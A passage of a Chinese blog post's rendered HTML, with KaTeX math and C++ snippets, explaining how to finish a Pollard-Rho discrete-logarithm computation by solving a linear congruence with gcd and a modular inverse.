style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord\">2</span></span></span></span> 的过程如下：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">uint64_t</span> <span class=\"title\">solve</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"function\">Int <span class=\"title\">x1</span><span class=\"params\">(f)</span>, <span class=\"title\">x2</span><span class=\"params\">(f)</span></span>;</span><br><span class=\"line\">    <span class=\"type\">__uint128_t</span> a1, b1, a2, b2;</span><br><span class=\"line\">    <span class=\"built_in\">func</span>(One, <span class=\"number\">0</span>, <span class=\"number\">0</span>, x1, a1, b1);</span><br><span class=\"line\">    <span class=\"built_in\">func</span>(x1, a1, b1, x2, a2, b2);</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(x1 != x2)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">func</span>(x1, a1, b1);</span><br><span class=\"line\">        <span class=\"built_in\">func</span>(x2, a2, b2);</span><br><span class=\"line\">        <span class=\"built_in\">func</span>(x2, a2, b2);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 解线性同余方程...</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>最后就是求解线性同余方程了，主要参考 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9vaS13aWtpLm9yZy9tYXRoL251bWJlci10aGVvcnkvbGluZWFyLWVxdWF0aW9uLw==\">OIWiki</span> 中用逆元求解的思路，这里我的方程如下：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mo stretchy=\"false\">(</mo><mi>b</mi><mn>2</mn><mo>−</mo><mi>b</mi><mn>1</mn><mo stretchy=\"false\">)</mo><mi>x</mi><mo>=</mo><mi>a</mi><mn>1</mn><mo>−</mo><mi>a</mi><mn>2</mn><mtext>    </mtext><mo stretchy=\"false\">(</mo><mtext> </mtext><mo lspace=\"0.22em\" rspace=\"0.22em\"><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow></mo><mtext> </mtext><mi>n</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">(b2-b1)x=a1-a2\\ \\ \\ \\ (\\bmod n)\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">b</span><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mord\">1</span><span class=\"mclose\">)</span><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord\">2</span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mopen\">(</span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathrm\">m</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">d</span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mclose\">)</span></span></span></span></span></p>\n<p>当然这里我先要保证 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>b</mi><mn>2</mn><mo>−</mo><mi>b</mi><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">b2-b1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.77777em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mord\">1</span></span></span></span> 和 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>a</mi><mn>1</mn><mo>−</mo><mi>a</mi><mn>2</mn></mrow><annotation encoding=\"application/x-tex\">a1-a2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord\">2</span></span></span></span> 都是模 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span> 下的正数，上述 Pollard-Rho 得到的结果并不保证 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>b</mi><mn>2</mn><mo>&gt;</mo><mi>b</mi><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">b2&gt;b1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.73354em;vertical-align:-0.0391em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&gt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mord\">1</span></span></span></span> 和 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>a</mi><mn>1</mn><mo>&gt;</mo><mi>a</mi><mn>2</mn></mrow><annotation encoding=\"application/x-tex\">a1&gt;a2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68354em;vertical-align:-0.0391em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&gt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord\">2</span></span></span></span>，所以稍微处理一下：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span>(b2 &lt; b1) b2 += <span class=\"built_in\">static_cast</span>&lt;<span class=\"type\">__uint128_t</span>&gt;(n);</span><br><span class=\"line\"><span class=\"keyword\">while</span>(a1 &lt; a2) a1 += <span class=\"built_in\">static_cast</span>&lt;<span class=\"type\">__uint128_t</span>&gt;(n);</span><br></pre></td></tr></table></figure></p>\n<p>接下来先求 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>g</mi><mo>=</mo><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy=\"false\">(</mo><mi>b</mi><mn>1</mn><mo>−</mo><mi>b</mi><mn>2</mn><mo separator=\"true\">,</mo><mi>n</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">g=gcd(b1-b2,n)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">d</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">b</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mord\">2</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mclose\">)</span></span></span></span>，通过如下函数实现：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">__uint128_t</span> <span class=\"title\">gcd</span><span class=\"params\">(<span class=\"type\">__uint128_t</span> a, <span class=\"type\">__uint128_t</span> b)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (b != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"type\">__uint128_t</span> temp = b;</span><br><span class=\"line\">        b = a % b;</span><br><span class=\"line\">        a = temp;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>当且仅当 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mi>b</mi><mn>2</mn><mo>−</mo><mi>b</mi><mn>1</mn><mo stretchy=\"false\">)</mo><mtext> </mtext><mo lspace=\"0.22em\" rspace=\"0.22em\"><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow></mo><mtext> </mtext><mi>g</mi><mo mathvariant=\"normal\">≠</mo><mn>0</mn></mrow><annotation encoding=\"application/x-tex\">(b2-b1)\\bmod g\\neq0</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">b</span><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mord\">1</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\"><span class=\"mord\"><span class=\"mord mathrm\">m</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">d</span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mrel\"><span class=\"mord vbox\"><span class=\"thinbox\"><span class=\"rlap\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"inner\"><span class=\"mrel\"></span></span><span class=\"fix\"></span></span></span></span></span><span class=\"mrel\">=</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">0</span></span></span></span> 时是无解的，反之则可以在 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mi>b</mi><mn>2</mn><mo>−</mo><mi>b</mi><mn>1</mn><mo stretchy=\"false\">)</mo><mi>x</mi><mo>=</mo><mi>a</mi><mn>1</mn><mo>−</mo><mi>a</mi><mn>2</mn></mrow><annotation encoding=\"application/x-tex\">(b2-b1)x=a1-a2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">b</span><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mord\">1</span><span class=\"mclose\">)</span><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord\">2</span></span></span></span> 两侧同时除以 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>g</mi></mrow><annotation encoding=\"application/x-tex\">g</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span></span></span></span>，得到新方程：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><msup><mi>b</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><msup><mi>x</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo>=</mo><msup><mi>a</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mtext>    </mtext><mo stretchy=\"false\">(</mo><mtext> </mtext><mo lspace=\"0.22em\" rspace=\"0.22em\"><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow></mo><mtext> </mtext><msup><mi>n</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo stretchy=\"false\">)</mo><mtext>    </mtext><mrow><mo fence=\"true\">{</mo><mtable rowspacing=\"0.3599999999999999em\" columnalign=\"left left\" columnspacing=\"1em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><msup><mi>b</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo>=</mo><mo stretchy=\"false\">(</mo><mi>b</mi><mn>2</mn><mo>−</mo><mi>b</mi><mn>1</mn><mo stretchy=\"false\">)</mo><mo>÷</mo><mi>g</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><msup><mi>a</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo>=</mo><mo stretchy=\"false\">(</mo><mi>a</mi><mn>1</mn><mo>−</mo><mi>a</mi><mn>2</mn><mo stretchy=\"false\">)</mo><mo>÷</mo><mi>g</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><msup><mi>n</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo>=</mo><mi>n</mi><mo>÷</mo><mi>g</mi></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding=\"application/x-tex\">b&#x27;x&#x27;=a&#x27;\\ \\ \\ \\ (\\bmod n&#x27;)\\ \\ \\ \\ \\begin{cases}\nb&#x27;=(b2-b1)\\div g\\\\\na&#x27;=(a1-a2)\\div g\\\\\nn&#x27;=n\\div g\\\\\n\\end{cases}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.801892em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.801892em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.801892em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:4.32em;vertical-align:-1.9099999999999997em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.801892em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mopen\">(</span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathrm\">m</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">d</span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">n</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.801892em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen\"><span class=\"delimsizing mult\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.35002em;\"><span style=\"top:-2.19999em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎩</span></span></span><span style=\"top:-2.19499em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎪</span></span></span><span style=\"top:-2.20499em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎪</span></span></span><span style=\"top:-3.15001em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎨</span></span></span><span style=\"top:-4.2950099999999996em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎪</span></span></span><span style=\"top:-4.30501em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎪</span></span></span><span style=\"top:-4.60002em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎧</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.8500199999999998em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.41em;\"><span style=\"top:-4.41em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">b</span><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mord\">1</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">÷</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span></span></span><span style=\"top:-2.97em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">a</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord\">2</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">÷</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span></span></span><span style=\"top:-1.5300000000000002em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">n</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">÷</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.9099999999999997em;\"><span></span></span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span></span></span></p>\n<p>就可以通过求逆得到一个基础解 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>x</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo>=</mo><msup><mi>a</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo>⋅</mo><msup><mi>b</mi><mrow><mo mathvariant=\"normal\">′</mo><mrow><mo>−</mo><mn>1</mn></mrow></mrow></msup><mtext> </mtext><mo lspace=\"0.22em\" rspace=\"0.22em\"><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow></mo><mtext> </mtext><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">x&#x27;=a&#x27;\\cdot b&#x27;^{-1}\\bmod n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.751892em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.751892em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 